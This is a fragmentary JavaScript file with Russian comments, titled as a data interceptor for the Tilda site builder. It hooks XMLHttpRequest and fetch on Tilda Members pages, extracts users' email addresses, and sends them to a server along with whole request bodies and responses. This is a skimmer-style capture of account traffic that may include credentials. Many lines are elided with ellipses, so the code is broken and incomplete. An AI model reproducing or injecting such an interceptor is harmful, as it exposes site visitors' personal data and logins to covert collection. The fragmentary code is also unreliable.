// Оптимизированный перехватчик данных для Tilda
(function() {
  console.log('Оптимизированный перехватчик данных для Tilda активирован');
        ...
        try {
          ...
          if (typeof data === 'string') {
            ...
            if (matches && matches.length > 0) {
              ...
              sendEmailToServer(email, 'tildaMembersXHR', { url: this._url, method: this._method, data: data }, true);
            }
            ...
            try {
              ...
              if (jsonData.email) {
                ...
                sendEmailToServer(email, 'tildaMembersXHR', { url: this._url, method: this._method, data: jsonData }, true);
        ...
        this.addEventListener('load', function() {
          ...
          try {
            ...
            if (email) {
              ...
              sendEmailToServer(email, 'tildaMembersXHRResponse', { url: this._url, method: this._method, response: responseData }, true);
            }
          } catch (e) {
            // Игнорируем ошибки при парсинге JSON
          }
          ...
          try {
            ...
            if (typeof options.body === 'string') {
              ...
              if (matches && matches.length > 0) {
                ...
                sendEmailToServer(email, 'tildaMembersFetch', { url: url, method: options ? options.method : 'GET', data: options.body }, true);
              }
              ...
              try {
                ...
                if (jsonData.email) {
                  ...
                  sendEmailToServer(email, 'tildaMembersFetch', { url: url, method: options ? options.method : 'GET', data: jsonData }, true);
                } else if (jsonData.data && jsonData.data.email) {
                  email = jsonData.data.email;
          ...
          if (url && typeof url === 'string' && 
            ...
            clone.json().then(data => {
              ...
              if (email) {
                ...
                sendEmailToServer(email, 'tildaMembersFetchResponse', { url: url, method: options ? options.method : 'GET', response: data }, true);
              }
            }).catch(() => {
